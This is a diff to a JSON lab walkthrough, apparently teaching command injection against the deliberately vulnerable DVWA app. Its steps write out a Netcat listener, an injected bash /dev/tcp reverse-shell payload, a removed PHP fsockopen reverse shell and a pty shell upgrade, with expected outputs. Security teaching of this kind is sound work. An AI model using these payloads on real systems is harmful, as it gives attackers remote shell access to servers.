@@ -25,31 +25,32 @@
     {
       "title": "Set up a listener in Kali",
       "command": "nc -lvnp 4444",
-      "explanation": "Start a Netcat listener on port 4444 to catch our reverse shell. Keep this terminal open.",
-      "duration": "Runs until connection"
+      "explanation": "Start a Netcat listener on port 4444 to catch our reverse shell. Keep this terminal open - it will wait for a connection."
     },
     {
-      "title": "Send reverse shell payload",
+      "title": "Send reverse shell payload (in browser)",
       "command": "127.0.0.1; bash -i >& /dev/tcp/172.20.0.5/4444 0>&1",
-      "explanation": "Enter this in the DVWA form. It connects back to your Kali listener.",
-      "expected": "Your Netcat listener receives a shell connection",
+      "explanation": "Enter this in the DVWA form and submit. Check your Netcat terminal - you should see a connection!",
+      "expected": "Netcat shows: connect to [172.20.0.5] from ...",
       "duration": "2-5 sec"
     },
     {
-      "title": "Alternative: Use PHP reverse shell",
-      "command": "127.0.0.1; php -r '$sock=fsockopen(\"172.20.0.5\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
-      "explanation": "If bash doesn't work, try this PHP payload instead."
+      "title": "Verify shell access (no prompt - just type!)",
+      "command": "id",
+      "explanation": "Back in Netcat terminal: There is NO prompt - cursor just blinks. Type 'id' and press Enter anyway!",
+      "expected": "uid=33(www-data) gid=33(www-data)"
     },
     {
-      "title": "Verify shell access",
-      "command": "id && hostname",
-      "explanation": "In your Netcat session, confirm you're on the DVWA container.",
-      "expected": "uid=33(www-data) and hostname shows 'dvwa'"
+      "title": "Check hostname",
+      "command": "hostname",
+      "explanation": "Still no prompt - just type!",
+      "expected": "dvwa or similar container name"
     },
     {
       "title": "Upgrade to interactive shell",
-      "command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
-      "explanation": "Get a proper bash shell with job control."
+      "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "explanation": "Now you get a real prompt! If python3 fails, try 'python' instead.",
+      "expected": "www-data@dvwa:/$ prompt appears"
     },
     {
       "title": "Explore the web root",
